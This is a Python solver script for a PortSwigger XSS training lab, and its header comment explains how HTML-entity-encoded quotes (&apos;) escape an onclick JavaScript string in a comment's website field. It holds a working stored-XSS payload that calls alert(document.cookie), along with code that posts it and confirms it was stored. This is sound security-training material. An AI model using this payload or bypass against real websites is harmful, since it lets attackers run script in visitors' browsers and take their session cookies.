# Lab 23 — Stored XSS into onclick event with angle brackets and double quotes
#           HTML-encoded and single quotes and backslash escaped
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped
#
# Vulnerability: Comment "website" field → reflected in onclick attribute
# Aim:           Submit a comment so clicking the author name calls alert(document.cookie)
#
# Technique:
#   Website field value ends up in an onclick handler:
#     <a onclick="...tracker.track('WEBSITE_VALUE')...">Author</a>
#
#   Angle brackets encoded. Single quotes escaped. Backslash escaped.
#   BUT: HTML attributes support HTML entity encoding, and the browser
#   HTML-decodes attribute content BEFORE executing JS event handlers.
#
#   &apos; (or &#x27;) looks like a harmless HTML entity to the server —
#   not a single quote, so it's not escaped. But the browser decodes it
#   to ' before running the onclick JS:
#
#     Payload:  http://foo?&apos;-alert(document.cookie)-&apos;
#     Browser decodes:  http://foo?'-alert(document.cookie)-'
#     onclick JS sees:  tracker.track('http://foo?'-alert(document.cookie)-'')
#                                                  ↑ breaks out of the string
#
#   Two parsing layers: HTML entity decoding → JS string context.
#
# Usage: python xss_lab23.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, post_comment, verify_stored

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WEBSITE_PAYLOAD = "http://foo?&apos;-alert(document.cookie)-&apos;"
POST_ID = 1

if __name__ == "__main__":
    banner()
    section("LAB 23 — STORED XSS: onclick EVENT, HTML ENTITY ENCODING BYPASS")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab23.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Posting comment with website: {WEBSITE_PAYLOAD}\n")
    r = post_comment(
        session, url, POST_ID,
        comment="Click my name",
        name="XSS Author",
        email="a@b.com",
        website=WEBSITE_PAYLOAD,
    )

    if r is None:
        print("  ✘  Comment submission failed")
        sys.exit(1)

    print(f"  ✔  Comment submitted (status {r.status_code})")
    print(f"  ➜  Verifying stored in post {POST_ID}...\n")
    verify_stored(session, url, POST_ID, WEBSITE_PAYLOAD, "HTML entity onclick payload")

    print()
    print("  ➜  Open the post in a browser and click the author name:")
    print(f"     {url}/post?postId={POST_ID}")
    print("  ℹ  Browser HTML-decodes &apos; → ' before executing onclick.")
    print("     The JS string breaks out → alert(document.cookie) fires.")
